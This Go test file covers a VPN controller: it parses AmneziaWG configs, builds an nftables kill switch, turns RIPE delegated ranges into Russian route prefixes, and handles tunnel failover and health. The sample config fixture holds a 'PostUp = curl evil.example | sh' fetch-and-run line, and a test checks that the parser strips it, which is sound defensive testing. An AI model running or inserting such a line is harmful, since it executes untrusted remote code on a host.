package main

import (
	"fmt"
	"net/netip"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// A provider export: wg-quick keys, AWG 2.0 keys in mixed case, comments.
const sampleConf = `[Interface]
Address = 10.98.184.37/32, fd00::25/128
PrivateKey = cHJpdmF0ZWtleXByaXZhdGVrZXlwcml2YXRla2V5MTI=
DNS = 10.0.0.1
Jc = 3
Jmin = 50
Jmax = 100
S1 = 79
S2 = 95
S3 = 10
S4 = 10
H1 = 14187797-14253332
H2 = 456445940-456511475
H3 = 1290827777-1290893312
H4 = 957026725-957092260
i1 = <b 0xce00>
PostUp = curl evil.example | sh  # never run

[Peer]
PublicKey = cHVibGlja2V5cHVibGlja2V5cHVibGlja2V5cHVibGk=
AllowedIPs = 0.0.0.0/0
Endpoint = 83.172.135.90:36939
PersistentKeepalive = 25
`

func TestParseAWGSplitsQuickKeysFromSetconf(t *testing.T) {
	c, err := parseAWG("world-1.conf", []byte(sampleConf))
	if err != nil {
		t.Fatal(err)
	}
	if c.Address.String() != "10.98.184.37/32" {
		t.Errorf("Address = %s", c.Address)
	}
	if c.Endpoint.String() != "83.172.135.90:36939" {
		t.Errorf("Endpoint = %s", c.Endpoint)
	}
	for _, gone := range []string{"Address", "DNS", "PostUp", "evil"} {
		if strings.Contains(c.SetConf, gone) {
			t.Errorf("setconf keeps %q:\n%s", gone, c.SetConf)
		}
	}
	for _, kept := range []string{"[Interface]\n", "PrivateKey = ", "S3 = 10\n", "S4 = 10\n",
		"H1 = 14187797-14253332\n", "i1 = <b 0xce00>\n", "[Peer]\n", "Endpoint = 83.172.135.90:36939\n",
		"PersistentKeepalive = 25\n"} {
		if !strings.Contains(c.SetConf, kept) {
			t.Errorf("setconf lacks %q:\n%s", kept, c.SetConf)
		}
	}
}

func TestParseAWGRejectsWhatTheKillSwitchCannotPin(t *testing.T) {
	cases := map[string]string{
		"hostname endpoint": strings.Replace(sampleConf, "83.172.135.90:36939", "vpn.example:36939", 1),
		"ipv6 endpoint":     strings.Replace(sampleConf, "83.172.135.90:36939", "[2001:db8::1]:36939", 1),
		"no endpoint":       strings.Replace(sampleConf, "Endpoint = 83.172.135.90:36939\n", "", 1),
		"no address":        strings.Replace(sampleConf, "Address = 10.98.184.37/32, fd00::25/128\n", "", 1),
		"two peers":         sampleConf + "[Peer]\nPublicKey = x\n",
		"bad section":       sampleConf + "[Other]\n",
	}
	for name, conf := range cases {
		if _, err := parseAWG("x.conf", []byte(conf)); err == nil {
			t.Errorf("%s: accepted", name)
		}
	}
}

func TestParseDelegatedCoversRangesExactly(t *testing.T) {
	const file = `2|ripencc|20260929|3|19830705|20260929|+0100
ripencc|*|ipv4|*|3|summary
ripencc|RU|ipv4|2.56.88.0|1024|20190101|allocated|x
ripencc|RU|ipv4|2.56.92.0|1024|20190101|allocated|x
ripencc|RU|ipv4|5.8.0.0|768|20110101|assigned|x
ripencc|DE|ipv4|5.9.0.0|65536|20110101|allocated|x
ripencc|RU|ipv4|10.0.0.0|256|20110101|available|x
ripencc|RU|ipv6|2a00::|32|20110101|allocated|x
`
	ps, err := parseDelegated(strings.NewReader(file), "RU")
	if err != nil {
		t.Fatal(err)
	}
	// 2.56.88.0/22 + 2.56.92.0/22 merge into a /21; 768 addresses split
	// into a /23 and a /24.
	want := "2.56.88.0/21 5.8.0.0/23 5.8.2.0/24"
	if got := fmt.Sprint(ps); got != "["+want+"]" {
		t.Errorf("prefixes = %s, want [%s]", got, want)
	}
}

func TestRangesToPrefixesAtTheEdges(t *testing.T) {
	cases := []struct {
		r    ipRange
		want string
	}{
		{ipRange{0, 0xffffffff}, "[0.0.0.0/0]"},
		{ipRange{0xfffffffe, 0xffffffff}, "[255.255.255.254/31]"},
		{ipRange{1, 6}, "[0.0.0.1/32 0.0.0.2/31 0.0.0.4/31 0.0.0.6/32]"},
	}
	for _, c := range cases {
		if got := fmt.Sprint(rangesToPrefixes([]ipRange{c.r})); got != c.want {
			t.Errorf("%v: %s, want %s", c.r, got, c.want)
		}
	}
}

func TestDiffPrefixes(t *testing.T) {
	p := netip.MustParsePrefix
	add, del := diffPrefixes([]netip.Prefix{p("1.0.0.0/8"), p("2.0.0.0/8")}, []netip.Prefix{p("2.0.0.0/8"), p("3.0.0.0/8")})
	if fmt.Sprint(add) != "[3.0.0.0/8]" || fmt.Sprint(del) != "[1.0.0.0/8]" {
		t.Errorf("add=%v del=%v", add, del)
	}
}

func TestKillSwitchLetsOnlyTunnelServersOut(t *testing.T) {
	ks := killSwitch()
	for _, want := range []string{
		`oifname "eth0" ip daddr @endpoints meta l4proto udp accept`,
		`oifname "eth0" drop`,
		`udp dport 53 redirect to :53`,
		`tcp dport 53 redirect to :53`,
	} {
		if !strings.Contains(ks, want) {
			t.Errorf("kill switch lacks %q", want)
		}
	}
	accept := strings.Index(ks, `@endpoints meta l4proto udp accept`)
	drop := strings.Index(ks, `oifname "eth0" drop`)
	if accept > drop {
		t.Error("the uplink drop comes before the endpoint accept")
	}
}

// fakeNet records commands; failing names make matching commands fail.
type fakeNet struct {
	calls   []string
	stdin   []string
	failing map[string]bool // "ping -I awg-world" style prefixes
	routes  string          // output of ip -4 route show default dev eth0
}

func (f *fakeNet) run(stdin, name string, args ...string) (string, error) {
	call := name + " " + strings.Join(args, " ")
	f.calls = append(f.calls, call)
	f.stdin = append(f.stdin, stdin)
	for prefix := range f.failing {
		if strings.HasPrefix(call, prefix) || strings.Contains(call, prefix) {
			return "", fmt.Errorf("%s failed", call)
		}
	}
	switch {
	case call == "ip -4 route show default dev eth0":
		out := f.routes
		f.routes = "" // the next look finds it removed
		return out, nil
	case strings.HasPrefix(call, "ip link show "):
		return "", fmt.Errorf("does not exist")
	}
	return "", nil
}

func testController(t *testing.T, f *fakeNet) *controller {
	t.Helper()
	conf := func(name, ep string) awgConf {
		c, err := parseAWG(name, []byte(strings.Replace(sampleConf, "83.172.135.90:36939", ep, 1)))
		if err != nil {
			t.Fatal(err)
		}
		return c
	}
	return &controller{
		run:    f.run,
		runDir: t.TempDir(),
		ru:     conf("ru-1.conf", "45.9.15.198:36056"),
		world:  []awgConf{conf("world-1.conf", "83.172.135.90:36939"), conf("world-2.conf", "46.246.127.133:37997")},
	}
}

func indexOf(calls []string, prefix string) int {
	for i, c := range calls {
		if strings.HasPrefix(c, prefix) {
			return i
		}
	}
	return -1
}

func TestSetupRaisesTheKillSwitchBeforeAnyTunnel(t *testing.T) {
	f := &fakeNet{routes: "default via 172.31.250.1 dev eth0\n"}
	c := testController(t, f)
	if err := c.setup(); err != nil {
		t.Fatal(err)
	}
	ks := indexOf(f.calls, "nft -f -")
	del := indexOf(f.calls, "ip route del default via 172.31.250.1 dev eth0")
	link := indexOf(f.calls, "ip link add awg-ru type amneziawg")
	if ks != 0 || del < 0 || link < 0 || !(ks < del && del < link) {
		t.Errorf("order: kill switch %d, default route removed %d, first tunnel %d:\n%s", ks, del, link, strings.Join(f.calls, "\n"))
	}
	for _, want := range []string{
		"nft add element inet reflux endpoints { 45.9.15.198 }",
		"ip route replace 45.9.15.198/32 via 172.31.250.1 dev eth0",
		"nft add element inet reflux endpoints { 83.172.135.90 }",
		"ip route replace blackhole default metric 4000",
		"ip route replace default dev awg-world metric 0",
		"awg setconf awg-world ",
	} {
		if indexOf(f.calls, want) < 0 {
			t.Errorf("setup never ran %q", want)
		}
	}
	// Only the active world server is let out, never the standby ones.
	if indexOf(f.calls, "nft add element inet reflux endpoints { 46.246.127.133 }") >= 0 {
		t.Error("a standby world server was let out")
	}
	// The setconf files hold private keys: none may be left behind.
	if left, _ := filepath.Glob(filepath.Join(c.runDir, "*.conf")); len(left) != 0 {
		t.Errorf("setconf files left: %v", left)
	}
}

func TestSetupFailsWhileTheUplinkRouteRemains(t *testing.T) {
	f := &fakeNet{routes: "default via 172.31.250.1 dev eth0\n", failing: map[string]bool{"ip route del default": true}}
	c := testController(t, f)
	// The fake forgets the route after the first look; bring it back to
	// model a delete that did not happen.
	c.run = func(stdin, name string, args ...string) (string, error) {
		if name+" "+strings.Join(args, " ") == "ip -4 route show default dev eth0" {
			return "default via 172.31.250.1 dev eth0\n", nil
		}
		return f.run(stdin, name, args...)
	}
	if err := c.setup(); err == nil {
		t.Error("setup succeeded with the uplink default route still in place")
	}
}

func TestWorldFailsOverAfterRepeatedFailures(t *testing.T) {
	f := &fakeNet{routes: "default via 172.31.250.1 dev eth0\n"}
	c := testController(t, f)
	if err := c.setup(); err != nil {
		t.Fatal(err)
	}
	f.calls = nil
	if err := c.failover(); err != nil {
		t.Fatal(err)
	}
	if c.cur != 1 {
		t.Fatalf("cur = %d", c.cur)
	}
	for _, want := range []string{
		"nft delete element inet reflux endpoints { 83.172.135.90 }",
		"nft add element inet reflux endpoints { 46.246.127.133 }",
		"awg setconf awg-world ",
	} {
		if indexOf(f.calls, want) < 0 {
			t.Errorf("failover never ran %q:\n%s", want, strings.Join(f.calls, "\n"))
		}
	}
	// The Russian server stays open whatever happens to the world tunnel.
	if indexOf(f.calls, "nft delete element inet reflux endpoints { 45.9.15.198 }") >= 0 {
		t.Error("failover closed the Russian server")
	}
	if err := c.failover(); err != nil || c.cur != 0 {
		t.Errorf("wrap-around: cur=%d err=%v", c.cur, err)
	}
}

func TestSetPrefixesRefusesAShortList(t *testing.T) {
	f := &fakeNet{}
	c := testController(t, f)
	short := []netip.Prefix{netip.MustParsePrefix("5.8.0.0/23")}
	if err := c.setPrefixes(short, time.Now()); err == nil {
		t.Error("a one-prefix list was applied")
	}
	if len(f.calls) != 0 {
		t.Errorf("routes touched: %v", f.calls)
	}
}

func TestSetPrefixesChangesOnlyTheDifference(t *testing.T) {
	f := &fakeNet{}
	c := testController(t, f)
	var ps []netip.Prefix
	for i := 0; i < minRUPrefixes; i++ {
		ps = append(ps, netip.PrefixFrom(addr(uint32(i)<<8), 24))
	}
	if err := c.setPrefixes(ps, time.Now()); err != nil {
		t.Fatal(err)
	}
	next := append(append([]netip.Prefix{}, ps[1:]...), netip.MustParsePrefix("100.0.0.0/24"))
	if err := c.setPrefixes(next, time.Now()); err != nil {
		t.Fatal(err)
	}
	batch := f.stdin[len(f.stdin)-1]
	if batch != "route del 0.0.0.0/24 dev awg-ru\nroute replace 100.0.0.0/24 dev awg-ru\n" {
		t.Errorf("second batch:\n%s", batch)
	}
}

func TestHealthIgnoresADeadRussianTunnel(t *testing.T) {
	now := time.Now()
	if err := healthy(status{Updated: now, WorldOK: true, RUOK: false}, now); err != nil {
		t.Errorf("unhealthy with only Russia down: %v", err)
	}
	if healthy(status{Updated: now, WorldOK: false}, now) == nil {
		t.Error("healthy with the world tunnel down")
	}
	if healthy(status{Updated: now.Add(-time.Minute), WorldOK: true}, now) == nil {
		t.Error("healthy with a stalled probe loop")
	}
}

func TestLoadConfigsOrdersWorldByName(t *testing.T) {
	dir := t.TempDir()
	for name, ep := range map[string]string{
		"ru-1.conf": "45.9.15.198:1", "world-2.conf": "2.2.2.2:1", "world-1.conf": "1.1.1.1:1", "notes.txt": "",
	} {
		body := strings.Replace(sampleConf, "83.172.135.90:36939", ep, 1)
		if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	ru, world, err := loadConfigs(dir)
	if err != nil {
		t.Fatal(err)
	}
	if ru.Name != "ru-1.conf" || len(world) != 2 || world[0].Name != "world-1.conf" || world[1].Name != "world-2.conf" {
		t.Errorf("ru=%s world=%v", ru.Name, []string{world[0].Name, world[1].Name})
	}
}
